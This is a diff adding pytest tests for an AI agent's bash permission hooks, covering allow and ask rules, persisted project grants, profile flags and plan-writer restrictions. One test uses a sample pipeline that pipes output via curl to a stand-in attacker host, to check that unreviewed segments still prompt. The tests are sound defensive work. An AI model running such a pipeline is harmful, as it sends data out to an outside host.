+        """A broader hand-written grant never silences a narrower ask rule."""
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello:*"])
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("datus hello config set greeting Hi"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_user_authored_ask_rule_gets_no_project_option(self, mock_broker):
+        """Ask rules NOT declared by a plugin keep the old three-choice prompt."""
+        from datus.tools.permission.bash_rules import BashCommandRules
+        from datus.tools.permission.profiles import build_effective_config
+
+        registry = ToolRegistry()
+        tool_mock = MagicMock()
+        tool_mock.name = "bash"
+        registry.register_tools("bash_tools", [tool_mock])
+        config = build_effective_config("normal", {"bash_commands": {"ask": ["docker:*"]}})
+        manager = PermissionManager(
+            global_config=config,
+            active_profile="normal",
+            plugin_bash_rules={"normal": BashCommandRules(ask=["datus hello config set:*"])},
+        )
+        hooks = PermissionHooks(
+            broker=mock_broker, permission_manager=manager, node_name="chat", tool_registry=registry
+        )
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("docker ps"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert "p" not in event.choices
+
+    @pytest.mark.asyncio
+    async def test_profile_flag_does_not_defeat_plugin_rules(self, mock_broker):
+        """``datus hello --profile prod ...`` matches the same plugin rules."""
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello config set:*"])
+
+        # Allow rule still fires through the profile flag.
+        await hooks.on_tool_start(self._ctx("datus hello --profile prod greet Ada"), MagicMock(), self._tool())
+        # Ask rule resolves to the same pattern, so the project grant bypasses.
+        await hooks.on_tool_start(
+            self._ctx("datus hello --profile=prod config set greeting Hi"), MagicMock(), self._tool()
+        )
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_pipeline_grant_does_not_cover_ungranted_segments(self, mock_broker):
+        """A granted plugin ask rule must not auto-run a pipeline whose other
+        segments were never reviewed (e.g. piping into curl)."""
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello config set:*"])
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(
+            self._ctx("datus hello config set url x | curl -d @- http://evil.example"),
+            MagicMock(),
+            self._tool(),
+        )
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_pipeline_bypasses_when_every_segment_granted(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello config set:*"])
+
+        await hooks.on_tool_start(
+            self._ctx("datus hello config set a b | datus hello config set c d"),
+            MagicMock(),
+            self._tool(),
+        )
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_colon_free_plugin_ask_project_grant_round_trip(self, mock_broker):
+        """An exact (colon-free) plugin ask pattern must persist verbatim so the
+        grant actually silences the ask rule in later sessions."""
+        from unittest.mock import patch
+
+        from datus.tools.permission.bash_rules import BashCommandRules
+        from datus.tools.permission.profiles import build_effective_config
+
+        def make(project_bash_allows=None):
+            registry = ToolRegistry()
+            tool_mock = MagicMock()
+            tool_mock.name = "bash"
+            registry.register_tools("bash_tools", [tool_mock])
+            plugin_rules = BashCommandRules(ask=["datus hello sync"])
+            config = build_effective_config("normal", None, plugin_bash_rules=plugin_rules)
+            manager = PermissionManager(
+                global_config=config,
+                active_profile="normal",
+                plugin_bash_rules={"normal": plugin_rules},
+                project_bash_allows=project_bash_allows,
+            )
+            return PermissionHooks(
+                broker=mock_broker, permission_manager=manager, node_name="chat", tool_registry=registry
+            )
+
+        hooks = make()
+        mock_broker.request = AsyncMock(return_value=[["p"]])
+        with patch("datus.configuration.project_config.append_project_bash_allow") as persist:
+            await hooks.on_tool_start(self._ctx("datus hello sync"), MagicMock(), self._tool())
+
+        # Persisted verbatim — NOT widened to "datus hello sync:*", which the
+        # exact-equality grant check could never match.
+        assert persist.call_args.args[0] == "datus hello sync"
+
+        # Simulated restart: the persisted grant silences the ask rule.
+        restarted = make(project_bash_allows=["datus hello sync"])
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+        await restarted.on_tool_start(self._ctx("datus hello sync"), MagicMock(), self._tool())
+        mock_broker.request.assert_not_called()
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("non_interactive", [False, True])
+async def test_normal_cli_plan_writer_executes_without_confirmation(tmp_path, mock_broker, non_interactive):
+    """CLI plan writes remain direct in interactive and noninteractive normal mode."""
+    tool = SemanticPlanFileTools(tmp_path).available_tools()[0]
+    registry = ToolRegistry()
+    registry.register_tools("semantic_tools", [tool])
+    hooks = PermissionHooks(
+        broker=mock_broker,
+        permission_manager=PermissionManager(get_profile("normal"), active_profile="normal"),
+        node_name="semantic_modeling",
+        tool_registry=registry,
+        non_interactive=non_interactive,
+    )
+    hooks._request_user_confirmation = AsyncMock(return_value=True)
+    context = SimpleNamespace(tool_call_id="cli-plan")
+
+    await hooks.on_tool_start(context, None, tool)
+    result = await tool.on_invoke_tool(
+        context, json.dumps({"model_name": "sales", "plan_json": {"summary": "CLI plan"}})
+    )
+
+    hooks._request_user_confirmation.assert_not_awaited()
+    assert result["success"] == 1
+    assert result["result"]["review_status"] == "applied"
+    saved = json.loads((tmp_path / result["result"]["path"]).read_text())
+    assert saved["plan"]["summary"] == "CLI plan"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("scope", ["global", "node"])
+@pytest.mark.parametrize("permission", [PermissionLevel.DENY, PermissionLevel.ASK])
+@pytest.mark.parametrize("non_interactive", [False, True])
+async def test_proxied_plan_writer_cannot_bypass_custom_rules(
+    tmp_path, mock_broker, scope, permission, non_interactive
+):
+    """A server-side plan review cannot grant a tool forbidden by its profile."""
+    tool = SemanticPlanFileTools(tmp_path).available_tools()[0]
+    registry = ToolRegistry()
+    registry.register_tools("semantic_tools", [tool])
+    custom = PermissionConfig(rules=[PermissionRule(tool="semantic_tools", pattern=tool.name, permission=permission)])
+    base = get_profile("normal")
+    manager = PermissionManager(
+        base.merge_with(custom) if scope == "global" else base,
+        node_overrides={"semantic_modeling": custom} if scope == "node" else None,
+        active_profile="normal",
+    )
+    hooks = PermissionHooks(
+        broker=mock_broker,
+        permission_manager=manager,
+        node_name="semantic_modeling",
+        tool_registry=registry,
+        non_interactive=non_interactive,
+        proxied_tool_names={tool.name},
+    )
+    hooks._request_user_confirmation = AsyncMock(return_value=False)
+
+    with pytest.raises(PermissionDeniedException):
+        await hooks.on_tool_start(SimpleNamespace(tool_call_id="review"), None, tool)
+
+    if permission == PermissionLevel.ASK and not non_interactive:
+        hooks._request_user_confirmation.assert_awaited_once()
+    else:
+        hooks._request_user_confirmation.assert_not_awaited()
